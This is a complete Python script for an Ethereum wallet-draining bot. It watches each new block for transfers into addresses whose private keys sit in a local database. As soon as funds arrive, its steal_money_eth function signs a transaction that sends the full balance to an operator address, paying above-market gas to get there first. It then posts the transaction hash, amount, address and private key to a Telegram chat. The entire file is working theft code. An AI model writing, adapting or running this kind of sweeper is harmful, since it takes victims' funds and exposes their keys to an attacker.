from collections import Counter
import database as db
from web3 import Web3
import time
from config import send_address, eth_grab, eth_vhod, YOUR_CHAT_ID, TELEGRAM_BOT_TOKEN
import telegram
from telegram import Bot

bot = Bot(token=TELEGRAM_BOT_TOKEN)

web3 = Web3(Web3.HTTPProvider(eth_vhod))
blocks_eth = []

def start_vivod():
    """main function"""
    getblocks_eth()


def getblocks_eth():
    """get blocks"""
    while True:
        latestBlock = web3.eth.get_block(block_identifier = web3.eth.defaultBlock, full_transactions = True)
        if str(latestBlock.number) in blocks_eth:
            pass
        else:
            trans_eth = latestBlock.transactions
            print(f'Last Block! {str(latestBlock.number)} | ETH')
            trans_wallets_eth(trans_eth)
            blocks_eth.append(str(latestBlock.number))
        time.sleep(0.5)

def trans_wallets_eth(trans_eth):
    """extract to"""
    for x in trans_eth:
        try:
            to_address_split = x['to']
            to_address = to_address_split.split('\n')
            for address in to_address:
                res = db.search_vivod(address)
                if res == False:
                    pass
                else:
                    steal_money_eth(address)
        except:
            pass

def steal_money_eth(address):
    """withdraw"""
    try:
        balance = web3.eth.get_balance(address)
        gwei = web3.eth.gas_price + 2000000000


        wallet_key = db.get_info_address(address)
        grab_from_eth_balance = web3.toWei(eth_grab, 'ether')

        counter = 0
        while True:
            if balance < grab_from_eth_balance:
                counter = counter + 1
                if counter == 200:
                    return
                time.sleep(0.1)
            else:
                break
        nonce = web3.eth.get_transaction_count(address)
        gas = int(gwei) * 21000
        amount = balance - gas

        tx_price = {
            'chainId': 1,
            'nonce': nonce,
            'to': send_address,
            'value': amount,
            'gas': 21000,
            'gasPrice': int(gwei)
        }

        signed_tx = web3.eth.account.sign_transaction(tx_price, wallet_key)
        tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
        hash_xd = web3.toHex(tx_hash)
        amount_ether = web3.fromWei(amount, "ether")
        success_message = f' ✅  SUCCESSFUL ETH WITHDRAWAL  ✅ \n \n HASH: {hash_xd}   \n \n 💰 AMOUNT: {amount_ether} 💰  \n \n ADDRESS: {address}  \n \n PRIVATE: {wallet_key}'
        print(success_message)
        bot.send_message(chat_id=YOUR_CHAT_ID, text=success_message)
    except Exception as e:
        error_message = f'ETH | UNSUCCESSFUL WITHDRAWAL| ADDRESS: {address} | MISTAKE: {e}'
        print(error_message)
        bot.send_message(chat_id=YOUR_CHAT_ID, text=error_message)

if __name__ == "__main__":
    start_vivod()        
